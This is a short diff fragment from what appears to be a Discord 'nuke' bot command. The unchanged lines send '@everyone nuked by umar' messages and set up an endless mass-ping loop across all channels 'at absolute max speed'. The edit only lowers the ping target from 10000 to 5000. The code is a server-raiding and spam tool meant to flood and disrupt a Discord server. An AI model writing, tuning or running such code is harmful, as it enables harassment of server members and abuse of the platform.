@@ -58,7 +58,7 @@ async def nuke(ctx):
             asyncio.create_task(result.send(f"@everyone nuked by umar"))
     
     # STEP 5: MASS PING ALL CHANNELS AT ONCE - ABSOLUTE MAX SPEED
-    ping_target = 10000
+    ping_target = 5000
     ping_count = len(channels)
     
     # Create a queue of channels that never ends
